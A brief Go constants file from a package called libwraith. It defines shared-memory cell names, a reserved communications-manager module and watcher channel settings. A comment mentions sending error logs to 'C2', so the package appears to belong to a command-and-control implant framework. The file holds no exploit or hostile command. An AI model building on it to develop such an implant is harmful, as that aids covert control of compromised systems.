package libwraith

// Reserved locations in the shared memory with special purposes.
// All other locations should be namespaced.
const (
	// This cell holds the latest error which occurred, be it in a module
	// or Wraith itself. Can be used to send error logs to C2.
	SHM_ERRS = "err"
)

// Reserved module names for modules with special purposes.
// All other modules should be namespaced.
const (
	// This module is responsible for managing the SHM_TX_QUEUE and
	// SHM_RX_QUEUE memory cells and distributing the data within them
	// to individual modules responsible for its handling.
	//
	// Managing of this data includes:
	// - Verifying the integrity of the data
	// - Verifying the format of the data
	// - Verifying the signature of the data (if any)
	// - Encrypting/decrypting the data
	//
	// Those functions can be delegated to other modules, but this
	// must be done transparrently i.e., the manager must estabilish
	// its own way of speaking to those modules and all data must still
	// go through it.
	MOD_COMMS_MANAGER = "cmgr"
)

// Configuration options for shared memory.
const (
	// The size of watcher channels. Making this bigger makes update
	// delivery more reliable and ordered but increases memory usage
	// if a watcher isn't reading its updates.
	SHMCONF_WATCHER_CHAN_SIZE = 255

	// Timeout in seconds after which notifications for watchers are
	// dropped if writing to the channel blocks.
	SHMCONF_WATCHER_NOTIF_TIMEOUT = 1
)
